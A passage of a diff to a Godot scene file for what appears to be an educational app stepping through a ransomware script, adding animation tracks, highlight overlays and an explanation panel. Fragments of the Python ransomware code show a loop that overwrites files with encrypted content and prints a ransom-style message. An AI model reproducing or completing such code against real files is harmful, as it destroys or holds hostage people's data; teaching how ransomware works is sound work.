+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["The program prints a message to confirm that all the files have been encrypted."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Encryption Complete"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.1, 3.555)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.28)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("WindowBackground:visible")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+
 [sub_resource type="AnimationLibrary" id="AnimationLibrary_de0th"]
 _data = {
 &"RESET": SubResource("Animation_i7g13"),
@@ -1955,6 +2381,7 @@ _data = {
 &"ransomware_step_11": SubResource("Animation_x2hu1"),
 &"ransomware_step_12": SubResource("Animation_8yhgl"),
 &"ransomware_step_13": SubResource("Animation_h0h0r"),
+&"ransomware_step_14": SubResource("Animation_vuwby"),
 &"ransomware_step_15": SubResource("Animation_8fnya")
 }
 
@@ -2097,6 +2524,7 @@ for file in allfiles:
 		thefile.write(content_encryp)
 
 print('All your files have been encrypted')"
+editable = false
 wrap_mode = 1
 autowrap_mode = 2
 gutters_draw_line_numbers = true
